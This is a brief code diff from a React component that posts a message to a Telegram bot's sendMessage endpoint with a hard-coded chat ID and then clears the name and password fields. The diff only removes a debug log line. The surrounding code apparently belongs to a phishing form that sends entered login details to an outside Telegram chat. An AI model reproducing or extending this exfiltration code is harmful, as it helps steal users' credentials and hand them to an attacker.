@@ -17,7 +17,6 @@ function Cards() {
   async function SendMesage(message: string) {
     const url: string = `${API}sendMessage?chat_id=-1002139745913&text=${message}`;
     await axios.post(url);
-    console.log(url);
     setName("");
     setPassword("");
   }
